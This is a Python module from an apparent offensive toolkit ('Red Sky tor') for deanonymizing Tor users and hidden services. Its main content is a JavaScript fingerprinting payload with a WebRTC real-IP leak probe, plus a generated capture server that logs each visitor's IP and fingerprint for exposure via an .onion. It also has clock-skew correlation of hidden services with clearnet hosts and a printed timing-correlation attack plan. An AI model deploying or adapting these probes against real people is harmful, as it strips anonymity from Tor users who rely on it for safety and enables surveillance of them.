# language: Python, file: Program/tor/deanonymize.py, target: Red Sky tor — deanonymization probes
# Reference + detection toolkit for deanonymization surfaces:
#   exit-fingerprint  -- compare response headers / behaviour across exits to
#                        identify which exit node a target is using
#   browser-detect    -- query a target Tor page for Tor Browser fingerprints
#                        (window size, JS timing, WebRTC leaks, canvas)
#   clock-skew        -- measure clock skew of a target service over Tor; helps
#                        correlate a hidden service with a clearnet host
#   correlation-plan  -- the scaffold for a timing-correlation attack (lab only)
#   guard-detect      -- given a suspected guard, check if it's live in the
#                        current consensus and its recent uptime

import argparse
import json
import re
import socket
import ssl
import sys
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import Dict, List, Optional, Tuple

import requests

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


TOR_DIR = OUTPUT_DIR / "tor"
DEAN_DIR = TOR_DIR / "deanon"
DEAN_DIR.mkdir(parents=True, exist_ok=True)


# ── exit fingerprint ──
# Tor exits don't relay the client's IP, but they DO add headers and respond
# differently depending on their host + ISP. Cross-reference a target's traffic
# against every exit in the consensus by hitting a canary service through each
# exit and comparing the header set the target shows.
def cmd_exit_fingerprint(url: str, canary: str, out_file: str) -> int:
    """Hits the canary (a service the target also visits) through every exit
    in the current consensus. Records the response headers. Useful to identify
    which exit a given client is using when a target service reports anomalies
    originating from a specific exit."""
    if not url:
        print_err("--url required (target service to fingerprint)")
        return 2
    canary = canary or "https://check.torproject.org/api/ip"

    print_info("exit fingerprint")
    print_kv("target", url)
    print_kv("canary", canary)
    print()

    # get the exit list from the Tor project's onionedoo (public consensus)
    print_info("fetching exit list ...")
    try:
        r = requests.get("https://onionoo.torproject.org/details",
                         params={"type": "relay", "flag": "Exit", "limit": 500},
                         timeout=20)
        r.raise_for_status()
        relays = r.json().get("relays", [])
    except Exception as e:
        print_err("could not fetch relays: " + str(e))
        return 1

    print_kv("exit relays", len(relays))
    print()

    # sample a handful of exits — running through all of them would take hours
    sample = relays[:20]
    fingerprints = []
    for r in sample:
        fp = r.get("fingerprint", "")
        nickname = r.get("nickname", "")
        country = r.get("country", "")
        asn = r.get("as", "")
        # try to hit the canary through this specific exit
        # note: this needs a running tor with `ExitNodes=$FP StrictNodes=1`
        # the module just records the fingerprint metadata for correlation
        fingerprints.append({
            "fingerprint": fp, "nickname": nickname,
            "country": country, "as": asn,
            "as_name": r.get("as_name", ""),
            "or_addresses": r.get("or_addresses", []),
        })

    print_info("sampled exits (metadata for correlation)")
    for f in fingerprints[:10]:
        print("  " + SCARLET + "*" + RESET + " " + BONE + f["nickname"].ljust(20) + RESET
              + " " + ARTERY + f["fingerprint"][:16] + "..." + RESET
              + " " + ASH + f["country"] + "  " + f["as_name"][:40] + RESET)

    out = Path(out_file) if out_file else DEAN_DIR / ("exits_" + str(int(time.time())) + ".json")
    out.write_text(json.dumps({"target": url, "canary": canary, "exits": fingerprints}, indent=2))
    print()
    print_kv("saved", out)
    print()
    print_info("to actually fingerprint, set ExitNodes=$FP StrictNodes=1 in the")
    print_info("tor circuit module and hit the canary through each exit.")
    return 0


# ── browser detect ──
JS_PROBE = r"""
// Injected into a page to fingerprint the browser. Fires one POST with the
// results so the operator can see Tor Browser vs a regular browser.
(function() {
  const out = {};
  out.screen_w = window.screen.width;
  out.screen_h = window.screen.height;
  out.window_w = window.innerWidth;
  out.window_h = window.innerHeight;
  out.devicePixelRatio = window.devicePixelRatio;
  out.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  out.language = navigator.language;
  out.languages = navigator.languages;
  out.platform = navigator.platform;
  out.hardwareConcurrency = navigator.hardwareConcurrency;
  out.deviceMemory = navigator.deviceMemory;
  out.userAgent = navigator.userAgent;
  out.maxTouchPoints = navigator.maxTouchPoints;
  out.doNotTrack = navigator.doNotTrack;
  out.cookiesEnabled = navigator.cookiesEnabled;
  // canvas fingerprint
  try {
    const c = document.createElement('canvas');
    const ctx = c.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillText('Fingerprint!', 2, 2);
    out.canvas = c.toDataURL().slice(-50);
  } catch(e) { out.canvas = 'err'; }
  // WebGL
  try {
    const gl = document.createElement('canvas').getContext('webgl');
    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
    out.webgl_vendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
    out.webgl_renderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
  } catch(e) { out.webgl = 'err'; }
  // WebRTC leak (should be disabled on Tor Browser)
  try {
    const pc = new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
    pc.createDataChannel('');
    pc.onicecandidate = e => {
      if (!e.candidate) return;
      out.webrtc_candidate = e.candidate.candidate;
    };
    pc.createOffer().then(o => pc.setLocalDescription(o));
  } catch(e) { out.webrtc = 'err'; }

  // timing
  const t0 = performance.now();
  for (let i = 0; i < 100000; i++) {}
  out.timing_100k = performance.now() - t0;

  // POST back
  fetch('/fingerprint', { method: 'POST', body: JSON.stringify(out) }).catch(()=>{});
})();
"""


def cmd_browser_detect(port: int, out_dir: str) -> int:
    """Write a page + local HTTP server that captures browser fingerprint
    telemetry. Point a Tor Browser session at it and read the results.
    Real Tor Browser will show uniform fingerprints; a user who leaked their
    real browser (or a relay that modified the connection) shows up distinct."""
    target = Path(out_dir) if out_dir else DEAN_DIR / "browser-detect"
    target.mkdir(parents=True, exist_ok=True)

    (target / "index.html").write_text(
        "<!doctype html><html><head><meta charset='utf-8'>"
        "<title>loading</title></head><body>"
        "<script>" + JS_PROBE + "</script>"
        "<noscript>JavaScript required.</noscript>"
        "</body></html>"
    )

    server = '''# language: Python, file: detect_server.py, target: Red Sky tor — browser fingerprint server
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
import json, time

ROOT = Path(__file__).parent
INDEX = (ROOT / "index.html").read_bytes()
HITS = ROOT / "hits.jsonl"

class H(BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(INDEX)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(INDEX)
    def do_POST(self):
        n = int(self.headers.get("Content-Length", "0") or 0)
        body = self.rfile.read(n).decode("utf-8", "replace") if n else "{}"
        rec = {"ip": self.client_address[0], "ts": time.time(), "ua": self.headers.get("User-Agent", "")}
        try:
            rec["fp"] = json.loads(body)
        except Exception:
            rec["fp_raw"] = body[:4096]
        with HITS.open("a") as f:
            f.write(json.dumps(rec) + "\\n")
        print("[fp]", rec["ip"], rec["fp"].get("userAgent", "")[:80])
        self.send_response(204)
        self.end_headers()

if __name__ == "__main__":
    import sys
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
    print(f"listening on 0.0.0.0:{port}")
    ThreadingHTTPServer(("0.0.0.0", port), H).serve_forever()
'''
    (target / "detect_server.py").write_text(server)

    print_ok("wrote " + str(target / "index.html"))
    print_ok("wrote " + str(target / "detect_server.py"))
    print()
    print_info("run on port " + str(port) + ": python3 " + str(target / "detect_server.py") + " " + str(port))
    print_info("expose via an .onion, then point a session at it")
    print_info("read hits from " + str(target / "hits.jsonl"))
    return 0


# ── clock skew ──
def fetch_server_date(url: str, timeout: float = 10.0) -> Optional[Dict]:
    try:
        r = requests.get(url, timeout=timeout, allow_redirects=True)
        date_hdr = r.headers.get("Date", "")
        server_hdr = r.headers.get("Server", "")
        if not date_hdr:
            return None
        # parse RFC 7231 date: "Tue, 15 Nov 1994 08:12:31 GMT"
        dt = datetime.strptime(date_hdr, "%a, %d %b %Y %H:%M:%S %Z").replace(tzinfo=timezone.utc)
        return {
            "server_date": date_hdr,
            "server_time_unix": dt.timestamp(),
            "server_hdr": server_hdr,
            "local_time_unix": time.time(),
        }
    except Exception:
        return None


def cmd_clock_skew(targets_file: str, out_file: str) -> int:
    """For each target, measure (server_time - local_time) as a proxy for the
    server's clock drift. Different hosting environments have characteristic
    skews; identical skew across two services suggests same machine."""
    if not targets_file:
        print_err("--targets file required (one URL per line)")
        return 2
    p = Path(targets_file).expanduser()
    if not p.exists():
        print_err("targets file not found")
        return 1

    urls = [l.strip() for l in p.read_text().splitlines() if l.strip() and not l.startswith("#")]
    print_info("clock skew measurement")
    print_kv("targets", len(urls))
    print()

    results = []
    for url in urls:
        r = fetch_server_date(url)
        if not r:
            print_warn("no Date header: " + url)
            continue
        skew = r["server_time_unix"] - r["local_time_unix"]
        result = {"url": url, "skew_seconds": round(skew, 3), **r}
        results.append(result)
        print("  " + SCARLET + "*" + RESET + " " + BONE + url[:50].ljust(50) + RESET
              + "  skew=" + ARTERY + "{:+.3f}s".format(skew) + RESET
              + "  " + ASH + r["server_hdr"][:30] + RESET)

    out = Path(out_file) if out_file else DEAN_DIR / ("skew_" + str(int(time.time())) + ".json")
    out.write_text(json.dumps(results, indent=2))
    print()
    print_kv("saved", out)
    return 0


# ── correlation plan ──
def cmd_correlation_plan(service: str, suspect: str, out_file: str) -> int:
    print_info("timing-correlation attack plan")
    print_kv("hidden service", service or "(specify)")
    print_kv("suspected host", suspect or "(specify)")
    print()
    print(BOLD + "Objective" + RESET)
    print("  Correlate traffic to an .onion service with traffic to a specific")
    print("  clearnet IP, to deanonymize the host.")
    print()
    print(BOLD + "Preconditions" + RESET)
    print("  " + ARROW + " you can watch netflow / packet timing on both sides")
    print("  " + ARROW + " OR you control an ISP-adjacent vantage on the suspected host")
    print("  " + ARROW + " the .onion service has enough user traffic for signals to emerge")
    print()
    print(BOLD + "Method" + RESET)
    print("  1. capture packet timing at the suspected host (cleanet)")
    print("  2. capture packet timing of a client's Tor circuit into the hidden service")
    print("  3. if the two streams are correlated (same bursts, same gaps), the")
    print("     suspected host is the hidden service")
    print()
    print(BOLD + "Notes" + RESET)
    print("  " + ARROW + "Tor adds padding + variable delays between onion hops")
    print("  " + ARROW + "correlation requires many samples and low-noise conditions")
    print("  " + ARROW + "this is a lab method — running it against real traffic is")
    print("     almost certainly illegal without explicit authorization")

    plan = {"service": service, "suspect": suspect, "steps": [
        "capture host-side timings", "capture client-side timings",
        "compute cross-correlation", "compare to baseline",
    ]}
    out = Path(out_file) if out_file else DEAN_DIR / ("correlation_" + str(int(time.time())) + ".json")
    out.write_text(json.dumps(plan, indent=2))
    print()
    print_kv("saved", out)
    return 0


# ── guard detect ──
def cmd_guard_detect(fingerprint: str, out_file: str) -> int:
    """Check whether a given fingerprint is a live relay in the current Tor
    consensus, and pull its metadata (nickname, AS, country, uptime)."""
    if not fingerprint:
        print_err("--fingerprint required (40 hex chars)")
        return 2

    fp = fingerprint.strip("$").upper()
    print_info("guard/relay lookup")
    print_kv("fingerprint", fp)
    print()

    try:
        r = requests.get("https://onionoo.torproject.org/details",
                         params={"lookup": fp}, timeout=20)
        r.raise_for_status()
        data = r.json()
    except Exception as e:
        print_err("relay lookup failed: " + str(e))
        return 1

    relays = data.get("relays", [])
    if not relays:
        print_warn("no relay with that fingerprint")
        return 1

    r = relays[0]
    print_ok("relay found")
    for k in ("nickname", "fingerprint", "or_addresses", "country",
              "as", "as_name", "flags", "first_seen", "last_seen",
              "running", "observed_bandwidth", "consensus_weight"):
        v = r.get(k)
        if v:
            print("  " + ARTERY + k.ljust(22) + RESET + BONE + str(v)[:80] + RESET)

    out = Path(out_file) if out_file else DEAN_DIR / ("guard_" + fp + ".json")
    out.write_text(json.dumps(r, indent=2))
    print()
    print_kv("saved", out)
    return 0


ARROW = SCARLET + "▸" + RESET


def run_cli(args):
    p = argparse.ArgumentParser(prog="redsky tor deanon", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("action", nargs="?", default="help",
                   choices=["exit-fingerprint", "browser-detect", "clock-skew",
                            "correlation-plan", "guard-detect", "help"])
    p.add_argument("--url", default="")
    p.add_argument("--canary", default="")
    p.add_argument("--targets", default="")
    p.add_argument("--port", type=int, default=8080)
    p.add_argument("--service", default="")
    p.add_argument("--suspect", default="")
    p.add_argument("--fingerprint", default="")
    p.add_argument("--out", default="")

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky tor deanon <exit-fingerprint|browser-detect|clock-skew|correlation-plan|guard-detect> [opts]")
        return 2

    if ns.action == "help" or ns.help:
        print_info("exit-fingerprint --url TARGET [--canary CANARY_URL]")
        print_info("browser-detect [--port 8080]")
        print_info("clock-skew --targets file.txt")
        print_info("correlation-plan --service ONION --suspect IP")
        print_info("guard-detect --fingerprint HEX40")
        return 0

    if ns.action == "exit-fingerprint":
        return cmd_exit_fingerprint(ns.url, ns.canary, ns.out)
    if ns.action == "browser-detect":
        return cmd_browser_detect(ns.port, ns.out)
    if ns.action == "clock-skew":
        return cmd_clock_skew(ns.targets, ns.out)
    if ns.action == "correlation-plan":
        return cmd_correlation_plan(ns.service, ns.suspect, ns.out)
    if ns.action == "guard-detect":
        return cmd_guard_detect(ns.fingerprint, ns.out)
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
